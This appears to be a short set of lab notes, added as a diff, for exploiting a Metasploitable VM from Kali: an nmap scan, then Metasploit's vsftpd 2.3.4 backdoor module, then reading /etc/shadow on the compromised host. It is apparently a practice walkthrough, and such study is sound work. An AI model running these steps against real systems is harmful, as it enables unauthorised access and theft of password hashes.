@@ -1,0 +1,25 @@
+meta - ifconfig
+
+**kali terminal** --> nmap -T4 -A <Meta_ip>
+
+**open new terminal**
+
+msfconsole
+
+search vsftpd2.3.4
+
+use 0
+
+show options
+
+set rhosts <Meta_ip>
+
+exploit
+
+ls
+
+cd etc
+
+ls
+
+cat shadow
